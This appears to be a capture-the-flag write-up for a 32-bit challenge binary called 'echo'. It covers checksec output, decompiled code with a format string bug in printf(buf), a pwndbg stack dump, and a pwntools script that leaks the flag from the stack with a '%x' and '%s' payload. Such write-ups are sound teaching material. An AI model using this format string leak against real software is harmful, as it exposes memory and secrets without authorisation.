# echo

## Checksec

```sh
❯ checksec echo
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

## Reverse Analysis

```c
int main(int argc,char *argv)

{
  FILE *f;
  int stack_check;
  int stack_gard;
  char buf [64];
  char flag [64];
  int gard;
  int *local_10;
  
  local_10 = &argc;
  gard = *(int *)(stack_gard + 0x14);
  setvbuf(_stdout,(char *)0x0,2,0);
  memset(buf,0,0x40);
  memset(buf,0,0x40);
  puts("ECHOOOOOOOOOOOOOOOOOOOOOOOOOOO00000000oooooooooooo...");
  f = fopen("flag.txt","r");
  if (f == (FILE *)0x0) {
    puts("Flag File is Missing.");
    exit(0);
  }
  fgets(flag,0x40,f);
  printf("> ");
  fgets(buf,0x40,_stdin);
  printf(buf);
  // XXXX: here we have a format string vulnerability
  stack_check = 0;
  if (gard != *(int *)(stack_gard + 0x14)) {
    stack_check = Gard();
  }
  return stack_check;
}
```

## Vulnerability

The vulnerability in the code is a format string vulnerability. The `printf` function is used with user input (`buf`) as the format string, which can lead to arbitrary memory read/write operations. This can be exploited to leak memory contents or overwrite memory locations, potentially allowing an attacker to execute arbitrary code or gain unauthorized access to sensitive information.

## Exploitation

The general idea is to first locate what needs to be leaked, and then print it out using the appropriate method.

```sh
—pwndbg> stack 80
00:0000│ esp 0xffba3f50 —▸ 0xffba3f7c ◂— '%x %x %x %x %x %x %x %x %s \n'
01:0004│-0b4 0xffba3f54 ◂— 0x40 /* '@' */
02:0008│-0b0 0xffba3f58 —▸ 0xf2b015c0 (_IO_2_1_stdin_) ◂— 0xfbad2088
03:000c│-0ac 0xffba3f5c ◂— 0
... ↓        2 skipped
06:0018│-0a0 0xffba3f68 ◂— 0x1000
07:001c│-09c 0xffba3f6c —▸ 0xffba40d4 —▸ 0xffba4b3d ◂— './echo'
08:0020│-098 0xffba3f70 ◂— 0
09:0024│-094 0xffba3f74 —▸ 0xffba3fbc ◂— 'flag{aaaaaaaaaaaaaaa}\n'
0a:0028│-090 0xffba3f78 —▸ 0x94f91a0 ◂— 0xfbad2488
0b:002c│ eax 0xffba3f7c ◂— '%x %x %x %x %x %x %x %x %s \n'
0c:0030│-088 0xffba3f80 ◂— 'x %x %x %x %x %x %x %s \n'
0d:0034│-084 0xffba3f84 ◂— ' %x %x %x %x %x %s \n'
0e:0038│-080 0xffba3f88 ◂— '%x %x %x %x %s \n'
0f:003c│-07c 0xffba3f8c ◂— 'x %x %x %s \n'
10:0040│-078 0xffba3f90 ◂— ' %x %s \n'
11:0044│-074 0xffba3f94 ◂— '%s \n'
12:0048│-070 0xffba3f98 ◂— 0
... ↓        8 skipped
1b:006c│-04c 0xffba3fbc ◂— 'flag{aaaaaaaaaaaaaaa}\n'
1c:0070│-048 0xffba3fc0 ◂— '{aaaaaaaaaaaaaaa}\n'
1d:0074│-044 0xffba3fc4 ◂— 'aaaaaaaaaaaa}\n'
... ↓        2 skipped
20:0080│-038 0xffba3fd0 ◂— 0xf2000a7d /* '}\n' */
21:0084│-034 0xffba3fd4 —▸ 0xf2b23000 ◂— jg 0xf2b23047
22:0088│-030 0xffba3fd8 ◂— 0
... ↓        5 skipped
28:00a0│-018 0xffba3ff0 ◂— 0xffffffff
29:00a4│-014 0xffba3ff4 —▸ 0xf28e196c ◂— 0x914
2a:00a8│-010 0xffba3ff8 —▸ 0xf2b1d400 —▸ 0xf28d0000 ◂— 0x464c457f
2b:00ac│-00c 0xffba3ffc ◂— 0x22be6200
2c:00b0│-008 0xffba4000 —▸ 0xffba4020 ◂— 1
2d:00b4│-004 0xffba4004 —▸ 0xf2b00e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
2e:00b8│ ebp 0xffba4008 ◂— 0
2f:00bc│+004 0xffba400c —▸ 0xf28f4cb9 (__libc_start_call_main+121) ◂— add esp, 0x10
30:00c0│+008 0xffba4010 ◂— 0
31:00c4│+00c 0xffba4014 ◂— 0
32:00c8│+010 0xffba4018 —▸ 0xf290e13d (__new_exitfn+13) ◂— add ebx, 0x1f2cf7
33:00cc│+014 0xffba401c —▸ 0xf28f4cb9 (__libc_start_call_main+121) ◂— add esp, 0x10
34:00d0│+018 0xffba4020 ◂— 1
35:00d4│+01c 0xffba4024 —▸ 0xffba40d4 —▸ 0xffba4b3d ◂— './echo'
36:00d8│+020 0xffba4028 —▸ 0xffba40dc —▸ 0xffba4b44 ◂— 'CONDA_DEFAULT_ENV=base'
37:00dc│+024 0xffba402c —▸ 0xffba4040 —▸ 0xf2b00e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
38:00e0│+028 0xffba4030 —▸ 0xf2b00e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
39:00e4│+02c 0xffba4034 —▸ 0x80485f6 ◂— lea ecx, [esp + 4]
3a:00e8│+030 0xffba4038 ◂— 1
3b:00ec│+034 0xffba403c —▸ 0xffba40d4 —▸ 0xffba4b3d ◂— './echo'
3c:00f0│+038 0xffba4040 —▸ 0xf2b00e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
3d:00f4│+03c 0xffba4044 —▸ 0x8048750 ◂— push ebp
3e:00f8│+040 0xffba4048 —▸ 0xf2b58b60 (_rtld_global_ro) ◂— 0
3f:00fc│+044 0xffba404c ◂— 0
40:0100│+048 0xffba4050 ◂— 0xd94da52d
41:0104│+04c 0xffba4054 ◂— 0xb3550f37
42:0108│+050 0xffba4058 ◂— 0
... ↓        2 skipped
45:0114│+05c 0xffba4064 —▸ 0xf2b58b60 (_rtld_global_ro) ◂— 0
46:0118│+060 0xffba4068 ◂— 0
47:011c│+064 0xffba406c ◂— 0x22be6200
48:0120│+068 0xffba4070 —▸ 0xf2b59a20 ◂— 0
49:0124│+06c 0xffba4074 —▸ 0xf28f4c46 (__libc_start_call_main+6) ◂— add ebx, 0x20c1ee
4a:0128│+070 0xffba4078 —▸ 0xf2b00e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* ',\r#' */
4b:012c│+074 0xffba407c —▸ 0xf28f4d7c (__libc_start_main+140) ◂— mov edx, dword ptr [ebx + 0x1a0]
4c:0130│+078 0xffba4080 —▸ 0xf2b25af4 ◂— 0x33ff4
4d:0134│+07c 0xffba4084 —▸ 0x804a000 —▸ 0x8049f0c ◂— 1
4e:0138│+080 0xffba4088 ◂— 1
4f:013c│+084 0xffba408c —▸ 0x80484e0 ◂— xor ebp, ebp

```

While using `pwndbg`, break the program at `printf(buf)` and check the stack.
We can fetch what we want easily


```python
#!/usr/bin/python3

from pwn import *

context.log_level = "debug"
context.arch = "i386"

r = process("./echo")
# r = remote("124.16.75.117", 51004)
payload = b"%x " * 8 + b"%s "
# gdb.attach(r, "b*0x804871e")
r.sendlineafter(b"> ", payload)
r.interactive()
```
